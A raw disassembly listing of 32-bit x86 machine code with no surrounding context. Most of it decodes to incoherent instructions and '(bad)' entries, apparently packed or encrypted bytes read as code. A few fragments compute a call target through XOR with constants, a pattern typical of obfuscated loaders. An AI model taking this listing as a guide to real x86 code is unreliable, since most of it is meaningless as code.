  40ddce:	repz mov esi,cs
  40ddd1:	inc    ebx
  40ddd2:	jae    0x40de4d
  40ddd4:	add    ch,BYTE PTR [ebx]
  40ddd6:	jge    0x40ddce
  40ddd8:	push   ds
  40ddd9:	cdq    
  40ddda:	cmp    BYTE PTR ds:0xf8983f54,bl
  40dde0:	adc    DWORD PTR [ecx+0x3],eax
  40dde3:	inc    edx
  40dde4:	mov    bl,0xee
  40dde6:	xor    bh,dl
  40dde8:	out    0xd5,al
  40ddea:	fisttp WORD PTR [edx-0x41]
  40dded:	addr16 mov edi,0x6fc18873
  40ddf3:	mov    ebp,0x8d17dbfc
  40ddf8:	aad    0xca
  40ddfa:	fcos   
  40ddfc:	cmp    esi,ecx
  40ddfe:	gs cmp al,0x48
  40de01:	push   esp
  40de02:	mov    ebp,0xb063b5fb
  40de07:	int    0x15
  40de09:	js     0x40de28
  40de0b:	pop    edx
  40de0c:	shl    DWORD PTR [ebx+0x78],cl
  40de0f:	mov    dh,0xb4
  40de11:	mov    edx,0x45896c8c
  40de16:	or     BYTE PTR [ebx+0x558be845],cl
  40de1c:	adc    al,0x33
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x18ad671b],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40def9
  40de8e:	ss xor esi,ecx
  40de91:	popa   
  40de92:	sahf   
  40de93:	pop    ss
  40de94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de95:	enter  0xa255,0x69
  40de99:	xor    BYTE PTR [esp+esi*8+0x5ea39a07],dl
  40dea0:	stos   DWORD PTR es:[edi],eax
  40dea1:	nop
  40dea2:	sti    
  40dea3:	inc    edi
  40dea4:	xchg   ebp,eax
  40dea5:	jmp    0x1582aedb
  40deaa:	stc    
  40deab:	dec    esi
  40deac:	and    DWORD PTR [ebp+0x9],edx
  40deaf:	or     DWORD PTR [esi+edx*8-0x76cdc03d],eax
  40deb6:	mov    dh,0x58
  40deb8:	mov    dl,0xb8
  40deba:	dec    eax
  40debb:	mov    DWORD PTR [esi+0x52],edx
  40debe:	(bad)  
  40dec0:	adc    ebp,eax
  40dec2:	iret   
  40dec3:	or     al,0x70
  40dec5:	shl    DWORD PTR [ebp-0x715f3a1f],1
  40decb:	loop   0x40de8a
  40decd:	sub    BYTE PTR [eax+0x44],bh
  40ded0:	mov    DWORD PTR [esi-0x37],esp
  40ded3:	out    0x92,eax
  40ded5:	sub    DWORD PTR [edi-0x3c9d8db4],esi
  40dedb:	in     eax,dx
  40dedc:	jae    0x40df35
  40dede:	call   0xc5a88f1a
  40dee3:	mov    DWORD PTR [edi+edx*1+0x1d241476],edi
  40deea:	lds    ebp,FWORD PTR [edi]
  40deec:	add    cl,dh
  40deee:	shl    al,0x4f
  40def1:	or     BYTE PTR [eax],al
  40def3:	ret    
  40def4:	sub    DWORD PTR [ecx+0x26],eax
  40def7:	pop    esp
  40def8:	in     eax,dx
  40def9:	dec    ebx
  40defa:	adc    eax,0x22e25904
  40deff:	dec    edx
  40df00:	pop    edx
  40df01:	(bad)  
  40df02:	stc    
  40df03:	inc    esp
  40df04:	push   esp
  40df05:	popf   
  40df06:	mov    al,ds:0xa588082b
  40df0b:	xchg   cl,dh
  40df0d:	fiadd  WORD PTR [edi+0xe]
  40df10:	and    DWORD PTR [esi],0x391ee78a
  40df16:	push   esp
  40df17:	test   al,0x10
  40df19:	add    ebp,DWORD PTR [ecx-0x2f49a0da]
  40df1f:	add    DWORD PTR ds:0xfbe92e17,esi
  40df25:	jg     0x40dec8
  40df27:	gs int3 
  40df29:	hlt    
  40df2a:	imul   ebx,ebp,0x27
  40df2d:	xchg   ecx,eax
  40df2e:	pop    ds
  40df2f:	outs   dx,BYTE PTR ds:[esi]
  40df30:	sar    DWORD PTR [edi+0x4bfb481f],cl
  40df36:	jnp    0x40decd
  40df38:	ret    0x125a
  40df3b:	loope  0x40dfb8
  40df3d:	sbb    ecx,DWORD PTR ds:0x5192ec6b
  40df43:	sub    al,0x3
  40df45:	sub    DWORD PTR [edi-0x257f01ba],eax
  40df4b:	pop    edi
  40df4c:	fcmovnb st,st(5)
  40df4e:	jo     0x40deee
  40df50:	into   
  40df51:	arpl   WORD PTR [edi-0xe],si
  40df54:	or     BYTE PTR [ecx-0x75c0f2d0],0x88
  40df5b:	aaa    
  40df5c:	sahf   
  40df5d:	mov    WORD PTR [ebp+0x4965c523],?
  40df63:	(bad)
  40df66:	pop    edx
  40df67:	adc    al,0x10
  40df69:	push   ebx
  40df6a:	xchg   edi,eax
  40df6b:	(bad)  
  40df6c:	retf   
  40df6d:	pop    eax
  40df6e:	int    0x2d
  40df70:	out    dx,al
  40df71:	cs inc esp
  40df73:	into   
  40df74:	jle    0x40df88
  40df76:	cmp    DWORD PTR [ebx],esp
  40df78:	mov    eax,ds:0xe12ab4fe
  40df7d:	mov    ebp,0xdb22b89b
  40df82:	xchg   esi,eax
  40df83:	dec    ebx
  40df84:	sbb    DWORD PTR [esi+esi*2-0x1a],ebp
  40df88:	das    
  40df89:	mov    dh,0x8e
  40df8b:	xchg   ebx,eax
  40df8c:	inc    eax
  40df8d:	into   
  40df8e:	dec    edx
  40df8f:	jae    0x40df48
  40df91:	loope  0x40df24
  40df93:	jl     0x40dfa0
  40df95:	dec    eax
  40df96:	ror    BYTE PTR [ebx],0x38
  40df99:	cmp    edx,ebx
  40df9b:	or     ah,dl
  40df9d:	cld    
  40df9e:	jmp    0x40df7e
  40dfa0:	sub    bh,bh
  40dfa2:	data16 je 0x40df86
  40dfa5:	jbe    0x40dff9
  40dfa7:	xor    cl,bh
  40dfa9:	cmp    ebp,esi
  40dfab:	mov    ebx,0x8c010ab6
  40dfb0:	push   0x39
  40dfb2:	adc    BYTE PTR [ebx+0x5a0344c4],ch
  40dfb8:	xchg   esp,eax
  40dfb9:	inc    ebx
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
